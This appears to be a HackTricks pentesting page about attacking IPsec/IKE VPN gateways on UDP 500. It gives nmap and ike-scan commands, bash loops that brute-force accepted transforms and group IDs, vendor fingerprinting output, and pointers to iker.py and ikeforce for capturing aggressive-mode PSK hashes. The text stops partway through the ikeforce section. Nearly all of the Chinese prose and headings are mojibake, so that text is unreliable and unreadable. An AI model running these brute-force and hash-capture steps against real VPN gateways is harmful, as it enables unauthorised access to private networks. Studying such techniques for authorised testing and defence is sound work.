<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>500/udp - Pentesting IPsec/IKE VPN</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="500udp---pentesting-ipsecike-vpn"><a class="header" href="#500udp---pentesting-ipsecike-vpn">500/udp - Pentesting IPsec/IKE VPN</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
{% endhint %}
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯">åŸºæœ¬ä¿¡æ¯</a></h2>
<p><strong>IPsec</strong> è¢«å¹¿æ³›è®¤ä¸ºæ˜¯ä¿æŠ¤ç½‘ç»œä¹‹é—´ï¼ˆLANåˆ°LANï¼‰å’Œè¿œç¨‹ç”¨æˆ·åˆ°ç½‘ç»œç½‘å…³ï¼ˆè¿œç¨‹è®¿é—®ï¼‰é€šä¿¡çš„ä¸»è¦æŠ€æœ¯ï¼Œæ˜¯ä¼ä¸šVPNè§£å†³æ–¹æ¡ˆçš„æ”¯æŸ±ã€‚</p>
<p><strong>IKE</strong> ç®¡ç†ä¸¤ä¸ªç‚¹ä¹‹é—´çš„ <strong>å®‰å…¨å…³è”ï¼ˆSAï¼‰</strong> çš„å»ºç«‹ï¼Œå®ƒåœ¨ISAKMPçš„æ¡†æ¶ä¸‹è¿è¡Œï¼ŒISAKMPæ˜¯ä¸€ä¸ªç”¨äºèº«ä»½éªŒè¯å’Œå¯†é’¥äº¤æ¢çš„åè®®ã€‚è¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºå‡ ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li><strong>ç¬¬ä¸€é˜¶æ®µï¼š</strong> åœ¨ä¸¤ä¸ªç«¯ç‚¹ä¹‹é—´åˆ›å»ºä¸€ä¸ªå®‰å…¨é€šé“ã€‚è¿™æ˜¯é€šè¿‡ä½¿ç”¨é¢„å…±äº«å¯†é’¥ï¼ˆPSKï¼‰æˆ–è¯ä¹¦æ¥å®ç°çš„ï¼Œé‡‡ç”¨ä¸»æ¨¡å¼ï¼Œè¿™æ¶‰åŠä¸‰å¯¹æ¶ˆæ¯ï¼Œæˆ– <strong>æ¿€è¿›æ¨¡å¼</strong>ã€‚</li>
<li><strong>ç¬¬ä¸€é˜¶æ®µ.5ï¼š</strong> è™½ç„¶ä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œè¿™ä¸€é˜¶æ®µè¢«ç§°ä¸ºæ‰©å±•è®¤è¯é˜¶æ®µï¼Œé€šè¿‡è¦æ±‚ç”¨æˆ·åå’Œå¯†ç æ¥éªŒè¯è¯•å›¾è¿æ¥çš„ç”¨æˆ·çš„èº«ä»½ã€‚</li>
<li><strong>ç¬¬äºŒé˜¶æ®µï¼š</strong> è¿™ä¸€é˜¶æ®µä¸“æ³¨äºåå•†ç”¨äºä¿æŠ¤æ•°æ®çš„ <strong>ESP</strong> å’Œ <strong>AH</strong> çš„å‚æ•°ã€‚å®ƒå…è®¸ä½¿ç”¨ä¸ç¬¬ä¸€é˜¶æ®µä¸åŒçš„ç®—æ³•ï¼Œä»¥ç¡®ä¿ <strong>å®Œç¾å‰å‘ä¿å¯†ï¼ˆPFSï¼‰</strong>ï¼Œå¢å¼ºå®‰å…¨æ€§ã€‚</li>
</ul>
<p><strong>é»˜è®¤ç«¯å£ï¼š</strong> 500/udp</p>
<h2 id="ä½¿ç”¨-nmap-å‘ç°-æœåŠ¡"><a class="header" href="#ä½¿ç”¨-nmap-å‘ç°-æœåŠ¡"><strong>ä½¿ç”¨ nmap å‘ç°</strong> æœåŠ¡</a></h2>
<pre><code>root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
</code></pre>
<h2 id="å¯»æ‰¾æœ‰æ•ˆçš„è½¬æ¢"><a class="header" href="#å¯»æ‰¾æœ‰æ•ˆçš„è½¬æ¢"><strong>å¯»æ‰¾æœ‰æ•ˆçš„è½¬æ¢</strong></a></h2>
<p>IPSec é…ç½®å¯ä»¥ä»…å‡†å¤‡æ¥å—ä¸€ä¸ªæˆ–å‡ ä¸ªè½¬æ¢ã€‚è½¬æ¢æ˜¯å€¼çš„ç»„åˆã€‚<strong>æ¯ä¸ªè½¬æ¢</strong>åŒ…å«å¤šä¸ªå±æ€§ï¼Œå¦‚ DES æˆ– 3DES ä½œä¸º <strong>åŠ å¯†ç®—æ³•</strong>ï¼ŒSHA æˆ– MD5 ä½œä¸º <strong>å®Œæ•´æ€§ç®—æ³•</strong>ï¼Œé¢„å…±äº«å¯†é’¥ä½œä¸º <strong>è®¤è¯ç±»å‹</strong>ï¼ŒDiffie-Hellman 1 æˆ– 2 ä½œä¸ºå¯†é’¥ <strong>åˆ†å‘ç®—æ³•</strong>ï¼Œä»¥åŠ 28800 ç§’ä½œä¸º <strong>ç”Ÿå‘½å‘¨æœŸ</strong>ã€‚</p>
<p>ç„¶åï¼Œæ‚¨é¦–å…ˆè¦åšçš„å°±æ˜¯ <strong>æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„è½¬æ¢</strong>ï¼Œè¿™æ ·æœåŠ¡å™¨æ‰èƒ½ä¸æ‚¨é€šä¿¡ã€‚ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…· <strong>ike-scan</strong>ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒIke-scan åœ¨ä¸»æ¨¡å¼ä¸‹å·¥ä½œï¼Œå¹¶å‘ç½‘å…³å‘é€ä¸€ä¸ªå¸¦æœ‰ ISAKMP å¤´å’Œä¸€ä¸ªåŒ…å« <strong>å…«ä¸ªè½¬æ¢çš„å•ä¸ªææ¡ˆ</strong>çš„æ•°æ®åŒ…ã€‚</p>
<p>æ ¹æ®å“åº”ï¼Œæ‚¨å¯ä»¥è·å¾—æœ‰å…³ç«¯ç‚¹çš„ä¸€äº›ä¿¡æ¯ï¼š</p>
<pre><code>root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
</code></pre>
<p>å¦‚æ‚¨åœ¨ä¹‹å‰çš„å›å¤ä¸­æ‰€è§ï¼Œæœ‰ä¸€ä¸ªå­—æ®µå«åš <strong>AUTH</strong>ï¼Œå…¶å€¼ä¸º <strong>PSK</strong>ã€‚è¿™æ„å‘³ç€ VPN æ˜¯ä½¿ç”¨é¢„å…±äº«å¯†é’¥é…ç½®çš„ï¼ˆè¿™å¯¹æ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´éå¸¸å¥½ï¼‰ã€‚<br />
<strong>æœ€åä¸€è¡Œçš„å€¼ä¹Ÿéå¸¸é‡è¦ï¼š</strong></p>
<ul>
<li><em>0 è¿”å›æ¡æ‰‹ï¼›0 è¿”å›é€šçŸ¥:</em> è¿™æ„å‘³ç€ç›®æ ‡ <strong>ä¸æ˜¯ IPsec ç½‘å…³</strong>ã€‚</li>
<li><em><strong>1 è¿”å›æ¡æ‰‹ï¼›0 è¿”å›é€šçŸ¥:</strong></em> è¿™æ„å‘³ç€ <strong>ç›®æ ‡å·²é…ç½®ä¸º IPsecï¼Œå¹¶æ„¿æ„è¿›è¡Œ IKE åå•†ï¼Œæ‚¨æè®®çš„ä¸€ä¸ªæˆ–å¤šä¸ªå˜æ¢æ˜¯å¯æ¥å—çš„</strong>ï¼ˆæœ‰æ•ˆçš„å˜æ¢å°†åœ¨è¾“å‡ºä¸­æ˜¾ç¤ºï¼‰ã€‚</li>
<li><em>0 è¿”å›æ¡æ‰‹ï¼›1 è¿”å›é€šçŸ¥:</em> VPN ç½‘å…³åœ¨ <strong>æ²¡æœ‰å¯æ¥å—çš„å˜æ¢æ—¶</strong> ä¼šä»¥é€šçŸ¥æ¶ˆæ¯å“åº”ï¼ˆå°½ç®¡æœ‰äº›ç½‘å…³ä¸ä¼šï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹åº”è¿›è¡Œè¿›ä¸€æ­¥åˆ†æå¹¶å°è¯•ä¿®è®¢ææ¡ˆï¼‰ã€‚</li>
</ul>
<p>ç„¶åï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†æœ‰æ•ˆçš„å˜æ¢ï¼Œä½†å¦‚æœæ‚¨å¤„äºç¬¬ä¸‰ç§æƒ…å†µï¼Œåˆ™éœ€è¦ <strong>ç¨å¾®æš´åŠ›ç ´è§£ä¸€ä¸‹ä»¥æ‰¾åˆ°æœ‰æ•ˆçš„å˜æ¢ï¼š</strong></p>
<p>é¦–å…ˆï¼Œæ‚¨éœ€è¦åˆ›å»ºæ‰€æœ‰å¯èƒ½çš„å˜æ¢ï¼š</p>
<pre><code class="language-bash">for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" &gt;&gt; ike-dict.txt ;done ;done ;done ;done
</code></pre>
<p>ç„¶åä½¿ç”¨ ike-scan å¯¹æ¯ä¸€ä¸ªè¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆè¿™å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼‰ï¼š</p>
<pre><code class="language-bash">while read line; do (echo "Valid trans found: $line" &amp;&amp; sudo ike-scan -M $line &lt;IP&gt;) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done &lt; ike-dict.txt
</code></pre>
<p>å¦‚æœæš´åŠ›ç ´è§£æ²¡æœ‰æˆåŠŸï¼Œå¯èƒ½æœåŠ¡å™¨å³ä½¿å¯¹æœ‰æ•ˆçš„å˜æ¢ä¹Ÿæ²¡æœ‰è¿›è¡Œæ¡æ‰‹å“åº”ã€‚é‚£ä¹ˆï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨æ¿€è¿›æ¨¡å¼è¿›è¡Œç›¸åŒçš„æš´åŠ›ç ´è§£ï¼š</p>
<pre><code class="language-bash">while read line; do (echo "Valid trans found: $line" &amp;&amp; ike-scan -M --aggressive -P handshake.txt $line &lt;IP&gt;) | grep -B7 "SA=" | grep "Valid trans found" ; done &lt; ike-dict.txt
</code></pre>
<p>å¸Œæœ›<strong>æœ‰æ•ˆçš„è½¬æ¢è¢«å›æ˜¾</strong>ã€‚<br />
æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://github.com/isaudits/scripts/blob/master/iker.py"><strong>iker.py</strong></a> å°è¯•<strong>ç›¸åŒçš„æ”»å‡»</strong>ã€‚<br />
æ‚¨è¿˜å¯ä»¥å°è¯•ä½¿ç”¨ <a href="https://github.com/SpiderLabs/ikeforce"><strong>ikeforce</strong></a> è¿›è¡Œæš´åŠ›ç ´è§£è½¬æ¢ï¼š</p>
<pre><code class="language-bash">./ikeforce.py &lt;IP&gt; # No parameters are required for scan -h for additional help
</code></pre>
<p><img src="../.gitbook/assets/image%20(617).png" alt="" /></p>
<p>åœ¨ <strong>DH ç»„ï¼š14 = 2048 ä½ MODP</strong> å’Œ <strong>15 = 3072 ä½</strong><br />
<strong>2 = HMAC-SHA = SHA1ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼‰ã€‚<code>--trans</code> æ ¼å¼ä¸º $Enc,$Hash,$Auth,$DH</strong></p>
<p>æ€ç§‘è¡¨ç¤ºåº”é¿å…ä½¿ç”¨ DH ç»„ 1 å’Œ 2ï¼Œå› ä¸ºå®ƒä»¬ä¸å¤Ÿå¼ºå¤§ã€‚ä¸“å®¶è®¤ä¸ºï¼Œ<strong>èµ„æºä¸°å¯Œçš„å›½å®¶å¯ä»¥è½»æ˜“ç ´è§£ä½¿ç”¨è¿™äº›å¼±ç»„çš„æ•°æ®åŠ å¯†</strong>ã€‚è¿™é€šè¿‡ä½¿ç”¨ä¸€ç§ç‰¹æ®Šæ–¹æ³•æ¥å®ç°ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿå¿«é€Ÿç ´è§£ä»£ç ã€‚å°½ç®¡è®¾ç½®è¿™ç§æ–¹æ³•çš„æˆæœ¬å¾ˆé«˜ï¼Œä½†å®ƒå…è®¸è¿™äº›å¼ºå¤§çš„å›½å®¶å®æ—¶è¯»å–åŠ å¯†æ•°æ®ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ä¸å¼ºçš„ç»„ï¼ˆå¦‚ 1,024 ä½æˆ–æ›´å°ï¼‰ã€‚</p>
<h3 id="æœåŠ¡å™¨æŒ‡çº¹è¯†åˆ«"><a class="header" href="#æœåŠ¡å™¨æŒ‡çº¹è¯†åˆ«">æœåŠ¡å™¨æŒ‡çº¹è¯†åˆ«</a></h3>
<p>ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ ike-scan å°è¯• <strong>å‘ç°è®¾å¤‡çš„ä¾›åº”å•†</strong>ã€‚è¯¥å·¥å…·å‘é€åˆå§‹ææ¡ˆå¹¶åœæ­¢é‡æ”¾ã€‚ç„¶åï¼Œå®ƒå°† <strong>åˆ†æ</strong> ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„ <strong>æ¶ˆæ¯</strong> ä¸åŒ¹é…å“åº”æ¨¡å¼ä¹‹é—´çš„ <strong>æ—¶é—´</strong> å·®å¼‚ï¼Œæ¸—é€æµ‹è¯•è€…å¯ä»¥æˆåŠŸè¯†åˆ« VPN ç½‘å…³ä¾›åº”å•†ã€‚æ­¤å¤–ï¼Œä¸€äº› VPN æœåŠ¡å™¨å°†ä½¿ç”¨å¯é€‰çš„ <strong>ä¾›åº”å•† ID (VID) è´Ÿè½½</strong> ä¸ IKEã€‚</p>
<p><strong>å¦‚æœ‰éœ€è¦ï¼Œè¯·æŒ‡å®šæœ‰æ•ˆçš„è½¬æ¢</strong>ï¼ˆä½¿ç”¨ --transï¼‰</p>
<p>å¦‚æœ IKE å‘ç°ä¾›åº”å•†ï¼Œå®ƒå°†æ‰“å°å‡ºæ¥ï¼š</p>
<pre><code>root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
</code></pre>
<p>è¿™ä¹Ÿå¯ä»¥é€šè¿‡ nmap è„šæœ¬ <em><strong>ike-version</strong></em> å®ç°ã€‚</p>
<h2 id="æŸ¥æ‰¾æ­£ç¡®çš„-idç»„å"><a class="header" href="#æŸ¥æ‰¾æ­£ç¡®çš„-idç»„å">æŸ¥æ‰¾æ­£ç¡®çš„ IDï¼ˆç»„åï¼‰</a></h2>
<p>ä¸ºäº†èƒ½å¤Ÿæ•è·å“ˆå¸Œï¼Œæ‚¨éœ€è¦ä¸€ä¸ªæ”¯æŒ Aggressive æ¨¡å¼çš„æœ‰æ•ˆè½¬æ¢å’Œæ­£ç¡®çš„ IDï¼ˆç»„åï¼‰ã€‚æ‚¨å¯èƒ½ä¸çŸ¥é“æœ‰æ•ˆçš„ç»„åï¼Œå› æ­¤æ‚¨éœ€è¦è¿›è¡Œæš´åŠ›ç ´è§£ã€‚<br />
ä¸ºæ­¤ï¼Œæˆ‘å»ºè®®æ‚¨ä½¿ç”¨ 2 ç§æ–¹æ³•ï¼š</p>
<h3 id="ä½¿ç”¨-ike-scan-è¿›è¡Œæš´åŠ›ç ´è§£-id"><a class="header" href="#ä½¿ç”¨-ike-scan-è¿›è¡Œæš´åŠ›ç ´è§£-id">ä½¿ç”¨ ike-scan è¿›è¡Œæš´åŠ›ç ´è§£ ID</a></h3>
<p>é¦–å…ˆå°è¯•ä½¿ç”¨å‡ ID å‘å‡ºè¯·æ±‚ï¼Œè¯•å›¾æ”¶é›†å“ˆå¸Œï¼ˆâ€œ-Pâ€ï¼‰ï¼š</p>
<pre><code class="language-bash">ike-scan -P -M -A -n fakeID &lt;IP&gt;
</code></pre>
<p>å¦‚æœ<strong>æ²¡æœ‰è¿”å›å“ˆå¸Œ</strong>ï¼Œé‚£ä¹ˆè¿™ç§æš´åŠ›ç ´è§£çš„æ–¹æ³•å¯èƒ½ä¼šæœ‰æ•ˆã€‚<strong>å¦‚æœè¿”å›äº†ä¸€äº›å“ˆå¸Œï¼Œè¿™æ„å‘³ç€å°†ä¼šä¸ºä¸€ä¸ªå‡IDå‘é€ä¸€ä¸ªå‡å“ˆå¸Œï¼Œå› æ­¤è¿™ç§æ–¹æ³•ä¸å¯é </strong>æ¥æš´åŠ›ç ´è§£IDã€‚ä¾‹å¦‚ï¼Œå¯èƒ½ä¼šè¿”å›ä¸€ä¸ªå‡å“ˆå¸Œï¼ˆè¿™åœ¨ç°ä»£ç‰ˆæœ¬ä¸­å‘ç”Ÿï¼‰ï¼š</p>
<p><img src="../.gitbook/assets/image%20(917).png" alt="" /></p>
<p>ä½†å¦‚æœå¦‚æˆ‘æ‰€è¯´ï¼Œæ²¡æœ‰è¿”å›å“ˆå¸Œï¼Œé‚£ä¹ˆä½ åº”è¯¥å°è¯•ä½¿ç”¨ike-scanæš´åŠ›ç ´è§£å¸¸è§çš„ç»„åã€‚</p>
<p>è¿™ä¸ªè„šæœ¬<strong>å°†å°è¯•æš´åŠ›ç ´è§£å¯èƒ½çš„ID</strong>ï¼Œå¹¶å°†è¿”å›æœ‰æ•ˆæ¡æ‰‹çš„IDï¼ˆè¿™å°†æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ç»„åï¼‰ã€‚</p>
<p>å¦‚æœä½ å‘ç°äº†ç‰¹å®šçš„è½¬æ¢ï¼Œè¯·å°†å…¶æ·»åŠ åˆ°ike-scanå‘½ä»¤ä¸­ã€‚å¦‚æœä½ å‘ç°äº†å¤šä¸ªè½¬æ¢ï¼Œå¯ä»¥è‡ªç”±æ·»åŠ ä¸€ä¸ªæ–°çš„å¾ªç¯æ¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼ˆä½ åº”è¯¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼Œç›´åˆ°å…¶ä¸­ä¸€ä¸ªæ­£å¸¸å·¥ä½œï¼‰ã€‚</p>
<p>ä½ å¯ä»¥ä½¿ç”¨<a href="https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic">ikeforceçš„å­—å…¸</a>æˆ–<a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt">seclistsä¸­çš„å­—å…¸</a>æ¥æš´åŠ›ç ´è§£å¸¸è§çš„ç»„åï¼š</p>
<pre><code class="language-bash">while read line; do (echo "Found ID: $line" &amp;&amp; sudo ike-scan -M -A -n $line &lt;IP&gt;) | grep -B14 "1 returned handshake" | grep "Found ID:"; done &lt; /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
</code></pre>
<p>Or use this dict (is a combination of the other 2 dicts without repetitions):</p>
<p>{% file src="../.gitbook/assets/vpnIDs.txt" %}</p>
<h3 id="ä½¿ç”¨-iker-è¿›è¡Œ-id-æš´åŠ›ç ´è§£"><a class="header" href="#ä½¿ç”¨-iker-è¿›è¡Œ-id-æš´åŠ›ç ´è§£">ä½¿ç”¨ Iker è¿›è¡Œ ID æš´åŠ›ç ´è§£</a></h3>
<p><a href="https://github.com/isaudits/scripts/blob/master/iker.py"><strong>iker.py</strong></a> ä¹Ÿä½¿ç”¨ <strong>ike-scan</strong> æ¥æš´åŠ›ç ´è§£å¯èƒ½çš„ç»„åã€‚å®ƒéµå¾ªè‡ªå·±çš„æ–¹æ³•æ¥ <strong>æ ¹æ® ike-scan çš„è¾“å‡ºæ‰¾åˆ°æœ‰æ•ˆçš„ ID</strong>ã€‚</p>
<h3 id="ä½¿ç”¨-ikeforce-è¿›è¡Œ-id-æš´åŠ›ç ´è§£"><a class="header" href="#ä½¿ç”¨-ikeforce-è¿›è¡Œ-id-æš´åŠ›ç ´è§£">ä½¿ç”¨ ikeforce è¿›è¡Œ ID æš´åŠ›ç ´è§£</a></h3>
<p><a href="https://github.com/SpiderLabs/ikeforce"><strong>ikeforce.py</strong></a> æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨æ¥ <strong>æš´åŠ›ç ´è§£ ID çš„å·¥å…·</strong>ã€‚è¯¥å·¥å…·å°† <strong>å°è¯•åˆ©ç”¨ä¸åŒçš„æ¼æ´</strong>ï¼Œä»¥ <strong>åŒºåˆ†æœ‰æ•ˆ ID å’Œæ— æ•ˆ ID</strong>ï¼ˆå¯èƒ½ä¼šæœ‰è¯¯æŠ¥å’Œæ¼æŠ¥ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘æ›´å–œæ¬¢åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ä½¿ç”¨ ike-scan æ–¹æ³•ï¼‰ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<strong>ikeforce</strong> å°†åœ¨å¼€å§‹æ—¶å‘é€ä¸€äº›éšæœº ID ä»¥æ£€æŸ¥æœåŠ¡å™¨çš„è¡Œä¸ºå¹¶ç¡®å®šä½¿ç”¨çš„ç­–ç•¥ã€‚</p>
<ul>
<li><strong>ç¬¬ä¸€ç§æ–¹æ³•</strong>æ˜¯é€šè¿‡ <strong>æœç´¢</strong> Cisco ç³»ç»Ÿçš„ <strong>æ­»å¯¹ç­‰æ£€æµ‹ DPD</strong> ä¿¡æ¯æ¥æš´åŠ›ç ´è§£ç»„åï¼ˆåªæœ‰åœ¨ç»„åæ­£ç¡®æ—¶ï¼ŒæœåŠ¡å™¨æ‰ä¼šå›å¤æ­¤ä¿¡æ¯ï¼‰ã€‚</li>
